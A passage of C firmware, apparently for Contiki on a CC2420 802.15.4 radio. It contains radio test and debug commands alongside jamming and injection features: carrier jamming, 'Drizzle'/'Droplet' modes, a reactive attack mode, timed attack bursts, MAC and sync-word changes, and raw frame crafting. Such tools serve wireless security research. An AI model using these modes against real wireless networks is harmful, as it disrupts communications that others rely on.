		printf("Finished sending %u packets\n", seqno);
		seqno = 0;
	}
}

static void
tx2_eth(void)
{
	int i;
	int errno;
	uint16_t buf[127/2+1];
	uint8_t *buf_ptr = (uint8_t *)buf;

	if(seqno < max_tx_packets) {
		etimer_set(&et, tx_interval / 2 + random_rand() % tx_interval);

#define MHR_LEN 7 // 16-bit FCF + 8-bit SEQ + 16-bit PAN + 16-bit DST
		// FCF: frame type Data, ack req = 1, dst add mode = 2, frame ver = 1 src add mode = 0
		buf[0] = 0x01<<0 | 0<<3 | 0<<4 | 1<<5 | 0<<6 | 0x0<<7 | 2<<10 | 1<<12 | 0<<14;
		buf_ptr[2] = (uint8_t)(seqno & 0x00FF);
		buf_ptr[3] = 0xFF;
		buf_ptr[4] = 0xFF;
		buf_ptr[5] = dst_addr.u8[1]; // dest. linkaddr lower byte
		buf_ptr[6] = dst_addr.u8[0]; // dest. linkaddr higher byte
		for(i = MHR_LEN;i < payload_len;++i) {
			buf_ptr[i] = (uint8_t)random_rand();
		}
		/* snprintf((char *)buf, sizeof(buf), "%u", seqno); */

		errno = cc2420_driver.send(buf, payload_len);
		if (errno == RADIO_TX_OK) printf(". ");
		else	printf("cc2420_send error: %d\n", errno);
		++seqno;
	} else {
		etimer_stop(&et);
		printf("Finished sending %u packets\n", seqno);
	}
}

static void
cs_eth(void)
{
	int rssi = -127;
	unsigned lna = 0;
	/* BUSYWAIT_UNTIL(status() & BV(CC2420_RSSI_VALID), RTIMER_SECOND / 100); */
	if (status() & BV(CC2420_RSSI_VALID)) {
		rssi = (int)((signed char)getreg(CC2420_RSSI));
		lna = getreg(CC2420_AGCCTRL) & 0x0003;
		printf("rssi = %d, lna = %u\n", rssi, lna);
	} else {
		printf("rssi = ?, lna = ?\n");
	}
}

static void
attack_eth(void)
{

	if (attack_on) {
		attack_on = 0;
		ADC1_PORT(OUT) &= ~BV(ADC1_PIN);
		leds_off(LEDS_RED);
		if (attack_count < max_attack_count) {
			printf("attack paused after %lu ms, resumes in %lu ms\n",
			       (et.timer.interval * 1000 + CLOCK_SECOND/2) / CLOCK_SECOND,
			       (attack_gap * 1000 + CLOCK_SECOND/2) / CLOCK_SECOND);
			etimer_set(&et, attack_gap);
		} else {
			etimer_stop(&et);
			rt.ptr = NULL; 		// stop rtimer
			attack_count = 0;
			reset_transmitter();
			printf("attack finished after %u attacks\n", max_attack_count);
		}
	}	else {
		attack_on = 1;
		start_mode(mode);
		printf("attack resumes %u/%u\n", attack_count, max_attack_count);
	}
}

struct mode {
	int mode;
	const char *display;
	void (*handler)(int mode);
	void (*prelog)(void);
	void (*prolog)(void);
	void (*et_handler)(void);
};

const static struct mode mode_list[] = {
	{RX, "RX", rx_mode, NULL, NULL, NULL},
	{CH, "Channel sampling", cs_mode, NULL, cs_prolog, cs_eth},
	{UNMOD, "Unmodulated carrier", unmod_mode, stop_rtimer, NULL, attack_eth},
	{MOD, "Modulated carrier", mod_mode, stop_rtimer, NULL, attack_eth},
	{TX, "TX broadcast", tx_mode, stop_rtimer, NULL, tx_eth},
	{TX2, "TX unicast", tx2_mode, stop_rtimer, NULL, tx2_eth},
	{DRIZZLE, "Drizzle", drizzle_mode, stop_rtimer, NULL, attack_eth},
	{DROPLET, "Droplet", droplet_mode, stop_rtimer, NULL, attack_eth},
	/* {JAM, "Reactive jamming", jam_mode, NULL, NULL, NULL}, */
	{ACK, "Reactive attack", ack_mode, NULL, NULL, ack_eth},
	{OFF, "OFF", off_mode, NULL, NULL, NULL},
	{-1, NULL, NULL, NULL, NULL, NULL}
};

void
start_mode(int new_mode)
{
	static int last_mode_index;
	const struct mode *p;
	for (p=&mode_list[0];p->handler;p++) {
		if(p->mode == new_mode) {
			PRINTF("last mode index %d\n", last_mode_index);
			if(mode_list[last_mode_index].prolog) {putchar('#'); mode_list[last_mode_index].prolog();}
			if(p->prelog) p->prelog();
			reset_transmitter();
			p->handler(new_mode);
			last_mode_index = p - mode_list;
			mode = new_mode;
			printf("%s mode\n", p->display);
			return;
		}
	}
	printf("Unknown mode\n");
}

/*-----------------------------------------------------------------------------*/
/* Etimer timeout handler */
static void
et_handler(void)
{
	const struct mode *p;

	etimer_reset(&et);
	for (p=&mode_list[0];p->handler;p++) {
		if(p->mode == mode) {
			if (p->et_handler) p->et_handler();
			else return;
		}
	}
}

/*-----------------------------------------------------------------------------*/
/* Test run etimer timeout handler */
static void
et_run_handler(void)
{
	/* if (run_ptr->next) { */
	/* 	run_ptr = run_ptr->next; */
	/* 	start_mode(run_ptr->mode); */
	/* } */
}

/*---------------------------------------------------------------------------*/
// radio receiver callback
/* static uint16_t rxbuf[64]; */
/* static const uint8_t *rxbuf_ptr = (uint8_t *)rxbuf; */
// Individual command handlers
static void
reboot(void)
{
	watchdog_reboot();
}
/*---------------------------------------------------------------------------*/
static void
power_up(void)
{
	int power = cc2420_get_txpower();
	if (power < 31) {
		cc2420_set_txpower(power+1);
	}
	printf("tx power = %u\n", cc2420_get_txpower());
}
/*---------------------------------------------------------------------------*/
static void
power_down(void)
{
	int power = cc2420_get_txpower();
	if (power > 0) {
		cc2420_set_txpower(power-1);
	}
	printf("tx power = %u\n", cc2420_get_txpower());
}
/*---------------------------------------------------------------------------*/
static void
rssi(void)
{
	int8_t val = cc2420_rssi();
	uint16_t reg = getreg(CC2420_AGCCTRL);
	unsigned lna = reg & 3;
	unsigned vga_gain = (reg &  (0x7F<<4)) >> 4;
	printf("RSSI = %d LNAMIX_GAINMODE = %u VGA_GAIN = %u\n", val, lna, vga_gain);
}
/*---------------------------------------------------------------------------*/
static void
channel_up(void)
{
	// TODO: protect radio state before switching, otherwise no RX after switch
	int chn = cc2420_get_channel();
	chn = (chn - 11 + 1) % 16 + 11;
	cc2420_set_channel(chn);
	printf("channel = %d\n", chn);
}
/*---------------------------------------------------------------------------*/
static void
channel_down(void)
{
	int chn = cc2420_get_channel();
	chn = (chn - 11 + 15) % 16 + 11;
	cc2420_set_channel(chn);
	printf("channel = %d\n", chn);
}
/*---------------------------------------------------------------------------*/
static void
mode_up(void)
{
	start_mode((mode + 1) % NUM_MODES);
}
/*---------------------------------------------------------------------------*/
static void
mode_down(void)
{
	start_mode((mode - 1) % NUM_MODES);
}
/*---------------------------------------------------------------------------*/
static void
view_rx_statistics(void)
{
	printf("rx = %lu llrx = %lu avg_rssi = %ld[%d,%d] avg_lqi = %lu[%u,%u] pkts_seen = %d pkts_read = %d\n",
				 rimestats.rx,
				 rimestats.llrx,
				 (sum_rssi - (long int)rimestats.llrx/2) / (long int)rimestats.llrx,
				 min_rssi, max_rssi,
				 (sum_lqi + rimestats.llrx/2) / rimestats.llrx,
				 min_lqi, max_lqi,
				 cc2420_packets_seen,
				 cc2420_packets_read);

	// reset stat counters
	memset(&rimestats, 0, sizeof(rimestats));
	sum_lqi = 0;
	sum_rssi = 0;
	min_rssi = 15;
	max_rssi = -55;
	min_lqi = 108;
	max_lqi = 0;
	cc2420_packets_seen = 0;
	cc2420_packets_read = 0;
}
/*---------------------------------------------------------------------------*/
static void
view_failed_rx_statistics(void)
{
	printf("bad crc = %lu bad synch = %lu too long = %lu too short = %lu\n",
				 rimestats.badcrc, 
				 rimestats.badsynch, 
				 rimestats.toolong,
				 rimestats.tooshort);
}
/*---------------------------------------------------------------------------*/
static void
view_tx_power_level(void){
	printf("tx power = %u\n", cc2420_get_txpower());
}
/*---------------------------------------------------------------------------*/
/* High speed serial debug mode */
// 8 modes: 0: Off (default) 1: AGC status output 2: Output ADC I/Q 3: Output down mixer I/Q 4: NA 5: NA 6: Input ADC I/Q 7: Input DAC I/Q
static void
debug_hssd(void)
{
#define HSSD_SRC_MSB 12
#define HSSD_SRC_LSB 10
	uint16_t reg = getreg(CC2420_IOCFG1);
	uint16_t hssd_src = FV(reg, HSSD_SRC_MSB, HSSD_SRC_LSB);
	hssd_src = (hssd_src + 1) % 8;
	if(hssd_src == 0) CC2420_ENABLE_FIFOP_INT();
	else	CC2420_DISABLE_FIFOP_INT();

	CC2420_FIFO_PORT(DIR) &= ~BV(CC2420_FIFO_PIN);
	reg = SETFV(reg, hssd_src, HSSD_SRC_MSB, HSSD_SRC_LSB);
	setreg(CC2420_IOCFG1, reg);
	reg = getreg(CC2420_IOCFG1);
	printf("HSSD_SRC: %u \n", FV(reg, HSSD_SRC_MSB, HSSD_SRC_LSB));
}

/*---------------------------------------------------------------------------*/
static void
debug_analog(void)
{
#define ATESTMOD_MODE_MSB 3
#define ATESTMOD_MODE_LSB 0
#define ATESTMOD_PD_MSB 4
#define ATESTMOD_PD_LSB 4
#define ATESTMOD_START 4 // first invocation jumpstarts to mode [0,8]

	uint16_t reg = getreg(CC2420_TOPTST);
	uint16_t atestmod_pd = FV(reg, ATESTMOD_PD_MSB, ATESTMOD_PD_LSB);
	uint16_t atestmod_mode = FV(reg, ATESTMOD_MODE_MSB, ATESTMOD_MODE_LSB);

	if (atestmod_pd) {
		// Power is down: start Atest and start from mode 0
		atestmod_pd = 0;
		atestmod_mode = ATESTMOD_START; // start from mode 4
	} else {
		// next mode
		atestmod_mode = (atestmod_mode+1) % 9;
		// Last mode: stop Atest
		if (atestmod_mode == ATESTMOD_START)
			atestmod_pd++;
	}

	reg = SETFV(reg, atestmod_pd, ATESTMOD_PD_MSB, ATESTMOD_PD_LSB);
	reg = SETFV(reg, atestmod_mode, ATESTMOD_MODE_MSB, ATESTMOD_MODE_LSB);
	setreg(CC2420_TOPTST, reg);
	reg = getreg(CC2420_TOPTST);
	printf("ATESTMOD_PD: %u ATESTMOD_MODE: %u\n",
				 FV(reg, ATESTMOD_PD_MSB, ATESTMOD_PD_LSB),
				 FV(reg, ATESTMOD_MODE_MSB, ATESTMOD_MODE_LSB));
}
/*---------------------------------------------------------------------------*/
static void
alter_syncword(void)
{
	#define SW 4
	const static uint16_t syncwords[SW] = {0xA70F, 0xA7FF, 0xA700, 0xCD0F};
	int i;
	uint16_t reg;

	reg = getreg(CC2420_SYNCWORD);
	for(i = 0;i < SW;i++) {
		if(syncwords[i] == reg) {
			reg = syncwords[(i+1) % SW];
			break;
		}
	}
	if (i==SW) reg = syncwords[0];

	setreg(CC2420_SYNCWORD, reg);
	reg = getreg(CC2420_SYNCWORD);
	printf("Syncword: 0x%X\n", reg);
}
/*---------------------------------------------------------------------------*/
/* Change my MAC address, can be used to alter ACK behaviour */
static void
mac_update(void)
{
	unsigned shortaddr;
	CC2420_READ_RAM(&shortaddr,CC2420RAM_SHORTADDR, 2);
	// increment higher byte and clear lower byte, must correspond to linkaddr_node_addr.u8[0] if Rime stack used
	shortaddr = ((shortaddr+0x0100) % 0x4000) & 0xFF00;
	CC2420_WRITE_RAM(&shortaddr,CC2420RAM_SHORTADDR, 2);
	printf("16-bit MAC address: 0x%04X\n", shortaddr);
}

/*---------------------------------------------------------------------------*/
/* Store 16 MAC address as permanent node ID in XMEM */
static void
burn_node_id(void)
{
	unsigned shortaddr;
	unsigned id;
	CC2420_READ_RAM(&shortaddr,CC2420RAM_SHORTADDR, 2);
	id = (shortaddr<<8)|(shortaddr>>8);
	node_id_burn(id);
	node_id_restore();
	printf("node ID now set to %u\n", node_id);
}
//
static void
read_tx_fifo(void)
{
	uint8_t byte[128];
	CC2420_READ_RAM(&byte,CC2420RAM_TXFIFO, 128);
	printf("TXFIFO content:\n");
	int i;
	for (i = 0;i < 128;i++) {
		printf("%02x", byte[i]);
	}
	printf("\n");
}

static void
write_tx_fifo(void)
{
	/* uint8_t byte = 3; */
	/* CC2420_WRITE_RAM(&byte,CC2420RAM_TXFIFO+10, 1); */
	/* printf("TXFIFO byte one %u\n", byte); */
	uint8_t snippet[6] = {0x00, 0x00, 0xA7, 4, 0x30, 0x31};
	unsigned short checksum;
	checksum = crc16_data(&snippet[4], sizeof(snippet)-4, 0);
	/* snippet[sizeof(snippet) - 2] = crc16>>8; */
	/* snippet[sizeof(snippet) - 1] = crc16&0xFF; */
	CC2420_WRITE_RAM(&snippet, CC2420RAM_TXFIFO, sizeof(snippet));
	CC2420_WRITE_RAM(&checksum, CC2420RAM_TXFIFO+sizeof(snippet), 2);
}

static void
read_rx_fifo(void)
{
	uint8_t byte[128];
	CC2420_READ_RAM(&byte,CC2420RAM_RXFIFO, 128);
	printf("RXFIFO content:\n");
	int i;
	for (i = 0;i < 128;i++) {
		printf("%02x", byte[i]);
	}
	printf("\n");
}

/*---------------------------------------------------------------------------*/
/* Convert a hex number into 16 bit characters, MSB first */
static char*
u16_to_bits(uint16_t n, char bits[])
{
	int i;

	for(i=0;i<16;i++) {
		bits[i] = (char)((n>>(15-i) & 1) + '0');
	}

	bits[i] = '\0';

	return bits;
}

static void
show_all_registers(void)
{
	uint16_t reg;
	enum cc2420_register addr;
	char bits[17]; //16 bits + '\0'

	for (addr = CC2420_MAIN;addr <= CC2420_RESERVED;addr++) {
		reg = getreg(addr);
		printf("0x%02X: 0x%04X %s\n", addr, reg,	u16_to_bits(reg, bits));
	}
}

/* static void */
/* status(void) */
/* { */
/*   uint8_t status; */
/*   CC2420_GET_STATUS(status); */
/* 	printf("Status 0x%01X\n", status); */
/* } */

/* Show current battery level */
/* Vtoggle=1.25/27*(72-BATTMON_VOLTAGE) */
static void
battery_level(void)
{
	unsigned lv, lv_orig;
	unsigned ok;
	unsigned reg;

	reg = getreg(CC2420_BATTMON);
	lv_orig = FV(reg, 4, 0);
	setreg(CC2420_BATTMON, SETFV(reg, 1, 5, 5)); // BATTMON_EN=1
	reg = getreg(CC2420_BATTMON);
	for(lv=0;lv<32;lv++) {
		setreg(CC2420_BATTMON, SETFV(reg, lv, 4, 0));
		reg = getreg(CC2420_BATTMON);
		ok = FV(reg, 6, 6);
		/* printf("%u: %u\n", lv, ok); */
		if(ok) break;
	}

	printf("Battery level is between %u and %u\n", lv-1, lv);
	setreg(CC2420_BATTMON, SETFV(reg, 0, 5, 5)); // BATTMON_EN=0
	setreg(CC2420_BATTMON, SETFV(reg, lv_orig, 4, 0)); // restore original monitor level
}

/* Assemble chunks into frame buf */
static void
assemble_packet_from_chunks(void)
{
	int i;
	uint8_t *p = frame_buf;
	for (i = 0; i < NCHUNKS; i++) {
		if (chunks[i].bufsize) {
			memcpy(p, chunks[i].buf, chunks[i].bufsize);
			p += chunks[i].bufsize;
		}
	}
	frame_buf_len = p - frame_buf;
	// debug print
	print_hex_buf("0x", frame_buf, frame_buf_len);
}

/* Clear chunk content */
static void
clear_chunk(void)
{
	if (chunks[chunk_index].buf) {
		free(chunks[chunk_index].buf);
		chunks[chunk_index].bufsize = 0;
		printf("chunk %d cleared!\n", chunk_index);
	}
}

static void
droplet_to_chunk(void)
{
	clear_chunk();
	size_t chunk_size = droplets[droplet_index].size;
	chunks[chunk_index].buf = malloc(chunk_size);
	memcpy(chunks[chunk_index].buf, droplets[droplet_index].data, chunk_size);
	chunks[chunk_index].bufsize = chunk_size;
	printf("chunk [%d]: ", chunk_index);
	print_hex_buf("0x", chunks[chunk_index].buf, chunk_size);
}

/* copy content of hex input buffer to current chunk buffer,
   then increment chunk index */
static void
hex_ibuf_to_chunk(void)
{
	clear_chunk();
	if (hex_ibuf_ptr && hex_ibuf_len > 0) {
		chunks[chunk_index].buf = malloc(hex_ibuf_len);
		memcpy(chunks[chunk_index].buf, hex_ibuf_ptr, hex_ibuf_len);
		chunks[chunk_index].bufsize = hex_ibuf_len;
		printf("chunk[%d]: ", chunk_index);
		print_hex_buf("0x", chunks[chunk_index].buf, chunks[chunk_index].bufsize);
		do_command("+c");
	}
}

static void
print_chunks(void)
{
	int i;
	for (i=0; i<NCHUNKS; i++) {
		printf("chunk %d: ", i);
		print_hex_buf("0x", chunks[i].buf, chunks[i].bufsize);
	}
}

static void
print_droplet(void)
{
	printf("droplet %u", droplet_index);
	print_hex_buf("0x", droplets[droplet_index].data, droplets[droplet_index].size);
}

static void
print_frame_buf(void)
{
	print_hex_buf("frame buf: 0x", frame_buf, frame_buf_len);
}

static void
increment_frame_buf_byte(void)
{
	if (frame_buf_byte_id < frame_buf_len) {
		frame_buf[frame_buf_byte_id]++;
	}
	print_frame_buf();
}

static const struct command cmd_list[] =    {
 {'e', "Reboot", reboot},
 {'w', "TX power level", view_tx_power_level},
 {'u', "TX power+", power_up},
 {'d', "TX power-", power_down},
 {'r', "RSSI", rssi},
 {'+', "Channel+", channel_up},
 {'-', "Channel-", channel_down},
 {'n', "Next mode", mode_up},
 {'p', "Previous mode", mode_down},
 {'v', "Successful pkt receptions", view_rx_statistics},
 {'V', "Unsuccessful pkt receptions", view_failed_rx_statistics},
 {'H', "Enter HSSD mode", debug_hssd},
 {'A', "Enable analog test mode", debug_analog},
 {'S', "Alter sync word", alter_syncword},
 {'M', "MAC address update", mac_update},
 {'L', "Show all registers", show_all_registers},
 /* {'s', "CC2420 status byte", status}, */
 {'b', "Battery level", battery_level},
 {'N', "Burn node id", burn_node_id},
 {'T', "Read TXFIFO", read_tx_fifo},
 {'W', "Write TXFIFO", write_tx_fifo},
 {'R', "Read RXFIFO", read_rx_fifo},
 {'a', "Assemble packet from chunks", assemble_packet_from_chunks},
 {'o', "Copy droplet to chunk buffer", droplet_to_chunk},
 {'x', "Copy hex input buffer to chunk buffer", hex_ibuf_to_chunk},
 {'c', "Print chunks", print_chunks},
 {'C', "Clear chunk", clear_chunk},
 {'D', "Print droplet", print_droplet},
 {'f', "Print frame buf", print_frame_buf},
 {'B', "Increment frame buf byte", increment_frame_buf_byte},
};

void
cc2420_set_receiver(void (*f)(const struct radio_driver *));
/*---------------------------------------------------------------------------*/
PROCESS_THREAD(test_process, ev, data)
{
  PROCESS_BEGIN();

	PROCESS_PAUSE();

	// debug prints
	printf("%s was compiled at %s %s\n", __FILE__, __DATE__, __TIME__);
	printf("F_CPU %lu CLOCK_CONF_SECOND %lu RTIMER_CONF_SECOND %u\n", F_CPU, CLOCK_CONF_SECOND, RTIMER_SECOND);

	/* pre-fill pseudo random data for TXFIFO */
	pad(txfifo_data, sizeof(txfifo_data), droplets[droplet_index].data, droplets[droplet_index].size, inc_first_byte);
	print_hex_buf("TXFIFO: ", txfifo_data, sizeof(txfifo_data));

	// change MAC address
	unsigned shortaddr;
	/* unsigned shortaddr = 1; */
	/* CC2420_WRITE_RAM(&shortaddr,CC2420RAM_SHORTADDR, 2); */
	CC2420_READ_RAM(&shortaddr,CC2420RAM_SHORTADDR, 2);
	printf("16-bit MAC addr: 0x%04X\n", shortaddr);

	// set CC2420 packet reception callback
	cc2420_set_rx_callback(&packet_input);

	commands_init(start_mode, getreg, setreg, cmd_list, sizeof(cmd_list) / sizeof(cmd_list[0]), field_list, sizeof(field_list) / sizeof(field_list[0]), variable_list, sizeof(variable_list) / sizeof(variable_list[0]));

	button_sensor.configure(SENSORS_ACTIVE, 1);

	/* initialize GPIO pins */
	GPIO1_PORT(DIR) |= BV(GPIO1_PIN);
	GPIO1_PORT(OUT) &= ~BV(GPIO1_PIN);
	GPIO1_PORT(OUT) |= BV(GPIO1_PIN);
	GPIO1_PORT(OUT) &= ~BV(GPIO1_PIN);
	GPIO2_PORT(DIR) |= BV(GPIO2_PIN);
	GPIO2_PORT(OUT) &= ~BV(GPIO2_PIN);
	GPIO2_PORT(OUT) |= BV(GPIO2_PIN);
	GPIO2_PORT(OUT) &= ~BV(GPIO2_PIN);

	/* init ADC pins as digital outputs */
	ADC0_PORT(SEL) &= ~BV(ADC0_PIN);
	ADC0_PORT(DIR) |= BV(ADC0_PIN);
	ADC1_PORT(SEL) &= ~BV(ADC1_PIN);
	ADC1_PORT(DIR) |= BV(ADC1_PIN);
	ADC1_PORT(OUT) &= ~BV(ADC1_PIN);
	ADC1_PORT(OUT) |= BV(ADC1_PIN);
	ADC1_PORT(OUT) &= ~BV(ADC1_PIN);

	/* Change channel */
  cc2420_set_channel(CHANNEL);
	cc2420_set_txpower(TXPOWER_LEVEL);

	etimer_set(&et, CLOCK_SECOND *1);
	PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&et));

  printf("Sampling process starts: channel = %d, txpower level = %u\n", CHANNEL, TXPOWER_LEVEL);

  /* initialize transceiver mode */
  start_mode(0);

	unsigned reg;
	reg = getreg(CC2420_IOCFG0);
	printf("IOCFG0 = 0x%04x\n", reg);
	/* set test output signal */
	reg = getreg(CC2420_IOCFG1);
	/* reg = (reg & (~CCAMUX_BV)) | (23<<0); */
	/* setreg(CC2420_IOCFG1, reg); */
	printf("IOCFG1 = 0x%04x\n", reg);
	reg = getreg(CC2420_MDMCTRL0);
	printf("MDMCTRL0 = 0x%04x\n", reg);
	reg = getreg(CC2420_MDMCTRL1);
	printf("MDMCTRL1 = 0x%04x\n", reg);

  while(1) {
    PROCESS_WAIT_EVENT();
    if(ev == PROCESS_EVENT_TIMER) {
	    if (etimer_expired(&et)) {
		    et_handler();
	    }
	    if (etimer_expired(&et_run)) {
		    et_run_handler();
	    }
    } else if(ev == serial_line_event_message) {
	    if (!air && !hexin) {
		    /* execute command */
		    do_command((char *)data);
	    } else if (air) {
		    /* copy command to frame buf, as the payload of a glossy data packet */
		    size_t slen = strlen((char *)data);
		    memcpy(frame_buf, glossy_data_pkt_payload, 8);
		    frame_buf[5] = slen;
		    memcpy(&frame_buf[8], data, slen);
		    frame_buf_len = 8 + slen;
		    air = 0;
		    printf("serial air=%u\n", air);
	    } else if (hexin) {
		    /* convert string as a hex sequence into buffer */
		    if (hex_ibuf_ptr) {
			    free(hex_ibuf_ptr);
		    }
		    hex_ibuf_len = strlen((char *)data) / 2;
		    printf("hex_ibuf_len = %u\n", hex_ibuf_len);
		    hex_ibuf_ptr = malloc(hex_ibuf_len);
		    hex_ibuf_len = fill_hex_buf(data, strlen((char *)data), hex_ibuf_ptr, hex_ibuf_len);
		    if (hex_ibuf_len > 0) {
			    print_hex_buf("", hex_ibuf_ptr, hex_ibuf_len);
		    }
		    hexin = 0;
		    printf("serial hexin=%u\n", hexin);
	    }
    } else if(ev == sensors_event && data == &button_sensor) {
      start_mode((mode + 1) % NUM_MODES);
    }
  }

  PROCESS_END();
}

/*---------------------------------------------------------------------------*/
static void
packet_input(void)
{
	int len;
	len = packetbuf_datalen();
	if(len > 0) {
		/* printf("%d: 0x", len); */
		int i;
		for(i = 0; i < len; i++) {
			printf("%02x", *((unsigned char *)(packetbuf_dataptr() + i)));
		}
		printf("\n");

		sum_rssi +=  (long int)((int16_t)packetbuf_attr(PACKETBUF_ATTR_RSSI));
		sum_lqi +=  packetbuf_attr(PACKETBUF_ATTR_LINK_QUALITY);
		min_rssi = (int)packetbuf_attr(PACKETBUF_ATTR_RSSI) < min_rssi ? (int)packetbuf_attr(PACKETBUF_ATTR_RSSI) : min_rssi;
		max_rssi = (int)packetbuf_attr(PACKETBUF_ATTR_RSSI) > max_rssi ? (int)packetbuf_attr(PACKETBUF_ATTR_RSSI) : max_rssi;
		min_lqi = packetbuf_attr(PACKETBUF_ATTR_LINK_QUALITY) < min_lqi ? packetbuf_attr(PACKETBUF_ATTR_LINK_QUALITY) : min_lqi;
		max_lqi = packetbuf_attr(PACKETBUF_ATTR_LINK_QUALITY) > max_lqi ? packetbuf_attr(PACKETBUF_ATTR_LINK_QUALITY) : max_lqi;

		/* execute serial command received from air */
		if (air==1 && len < 3) {
			*((uint8_t *)(packetbuf_dataptr() + len)) = '\0';
			do_command(packetbuf_dataptr());
		} else if (mode == ACK) {
			PRINTF("@");
			ack_handler(packetbuf_dataptr(), len);
		}
	}
}
